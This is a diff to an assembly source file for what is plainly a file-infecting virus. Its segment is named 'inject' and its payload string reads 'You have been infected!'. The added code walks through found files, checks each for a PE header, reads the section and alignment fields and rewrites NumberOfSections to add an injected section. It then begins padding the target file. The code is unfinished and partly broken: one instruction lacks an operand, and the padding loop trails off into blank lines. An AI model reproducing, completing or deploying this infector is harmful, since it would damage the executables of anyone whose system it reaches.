@@ -27,8 +27,8 @@ inject SEGMENT read write execute
     strContent db 'You have been infected!', 0
     
     ; .data?
-    tempByte db 0
-    tempWord dw 0
+;    tempByte db 0
+;    tempWord db 0
     tempDword dd 0
     tempDword2 dd 0
     filePath db 260 DUP(0) ; filePath[MAX_PATH]
@@ -148,7 +148,7 @@ start:
     call fromStack(ffind1)
     toStack fileHand
     
-    ; Open file
+    openFile:
     push 0
     push 80h ; FILE_ATTRIBUTE_NORMAL
     push 4 ; OPEN_ALWAYS
@@ -160,12 +160,90 @@ start:
 	toStack tgHand
 	
 	; Obtain and verify magic bytes "MZ"
-	invoke fromStack(fread),
-			fromStack(tgHand), 			; Handle
-			daccess(offset tempWord),	; Pointer to output
-			2							; Length
+	getval fromStack(tgHand), 2
+    cmp tempDword, 5a4dh
+    jne nextFile ; Not a PE file
     
-    cmp tempWord, 5a4dh
+    ; e_lfanew
+    getval fromStack(tgHand), 4, SEEK_SET, 3Ch
+	toStack lfanew, vaccess(tempDword)
+    
+    mov ecx, fromStack(lfanew)
+    add ecx, 6
+    getval fromStack(tgHand), 2, SEEK_SET, ecx
+    toStack NumberOfSections, vaccess(tempDword)
+    inc vaccess(tempDword)
+    setval fromStack(tgHand), 2, SEEK_SET, ecx ; Insert new NumberOfSections
+    
+    add ecx, 20 - 6 ; = lfanew + 20
+    getval fromStack(tgHand), 2, SEEK_SET, ecx
+    toStack SizeOfOptionalHeader, vaccess(tempDword)
+    
+    add ecx, 4 ; = lfanew + 24 = ioh_offset
+    toStack ioh_offset, ecx
+    getval fromStack(tgHand), 2, SEEK_SET, ecx
+    toStack Magic, vaccess(tempDword)
+    
+    mov ecx, fromStack(ioh_offset)
+    add ecx, 16
+    getval fromStack(tgHand), 4, SEEK_SET, ecx
+    toStack AddressOfEntryPoint, vaccess(tempDword)
+    
+    mov ecx, fromStack(ioh_offset)
+    add ecx, 32
+    getval fromStack(tgHand), 4, SEEK_SET, ecx
+    toStack SectionAlignment, vaccess(tempDword)
+    
+    getval fromStack(tgHand), 4
+    toStack FileAlignment, vaccess(tempDword)
+    
+    ; DWORD lastish_offset = ioh_offset + SizeOfOptionalHeader + 40 * (NumberOfSections - 1);
+    mov ecx, fromStack(ioh_offset)
+    add fromStack(SizeOfOptionalHeader)
+    mov edx, fromStack(NumberOfSections)
+    dec edx
+    imul edx, 40 ; Size of 1 section header
+    add ecx, edx
+    toStack lastish_offset, ecx
+    
+    add ecx, 12
+    getval fromStack(tgHand), 4, SEEK_SET, ecx
+    toStack lastish_VA, vaccess(tempDword)
+    
+    getval fromStack(tgHand), 4
+    toStack lastish_SizeOfRawData, vaccess(tempDword)
+    
+    mov ecx, fromStack(lastish_offset)
+    add ecx, 40
+    toStack newish_offset, ecx
+    
+    invoke fromStack(fseek), fromStack(tgHand), 0, 0, SEEK_END
+    
+    mov ebx, eax
+    inc ebx
+    closest	ebx, fromStack(FileAlignment)
+    dec ebx
+    sub eax, ebx
+    mov daccess(tempDword), 0
+    pad_start:
+    invoke fromStack(fwrite), fromStack(tgHand), daccess(tempDword), 1, daccess(tempDword2), 0
+    
+    
+    
+                             
+    nextFile:
+    invoke fromStack(fclose), fromStack(tgHand)
+    
+    invoke fromStack(ffind2),
+    		fromStack(fileHand),
+    		daccess(offset win32FindData)
+    		
+    cmp eax, 0
+    jne openFile
+    
+    ; No more file to write
+    invoke fromStack(fclose), fromStack(selfHand)
+    invoke fromStack(ffind0), fromStack(fileHand)
     
 inject ENDS
 end start
